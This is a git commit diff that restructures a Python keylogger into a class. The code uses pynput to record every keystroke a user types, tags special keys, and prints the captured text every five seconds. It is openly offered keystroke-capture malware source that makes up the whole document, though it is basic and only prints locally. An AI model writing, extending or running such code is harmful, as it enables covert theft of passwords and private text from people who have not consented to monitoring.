727e0871b82a81eee0ab80df56736a690ff69e36
shawn2506 <dsouzashawn62@yahoo.in>
2019-12-14 19:03:48 +0530

    Created class Keylogger

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -5,38 +5,40 @@ import threading
 
 logger = ""
 
-def process_key_press(key):
-    global logger
-    try:
-        logger = logger + str(key.char)
-    except AttributeError:
-        if key == key.space:
-            logger = logger + " Sp "
-        elif key == key.enter:
-            logger = logger + " Etr "
-        elif key == key.tab:
-            logger = logger + " Tb "
-        elif key == key.backspace:
-            logger = logger + " Bk "
-        elif key == key.right:
-            logger = logger + " rt "
-        elif key == key.left:
-            logger = logger + " lt "
-        elif key == key.up:
-            logger = logger + " up "
-        elif key == key.down:
-            logger = logger + " dn "
-        else:
-            logger = logger + " " + str(key) + " "
+class Keylogger:
+    def process_key_press(self, key):
+        global logger
+        try:
+            logger = logger + str(key.char)
+        except AttributeError:
+            if key == key.space:
+                logger = logger + " Sp "
+            elif key == key.enter:
+                logger = logger + " Etr "
+            elif key == key.tab:
+                logger = logger + " Tb "
+            elif key == key.backspace:
+                logger = logger + " Bk "
+            elif key == key.right:
+                logger = logger + " rt "
+            elif key == key.left:
+                logger = logger + " lt "
+            elif key == key.up:
+                logger = logger + " up "
+            elif key == key.down:
+                logger = logger + " dn "
+            else:
+                logger = logger + " " + str(key) + " "
 
-def report():
-    global logger
-    print(logger)
-    log = ""
-    timer = threading.Timer(5,report)
-    timer.start()
+    def report(self):
+        global logger
+        print(logger)
+        log = ""
+        timer = threading.Timer(5, self.report)
+        timer.start()
 
-keyboard_listener = pynput.keyboard.Listener(on_press = process_key_press)
-with keyboard_listener:
-    report()
-    keyboard_listener.join()
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
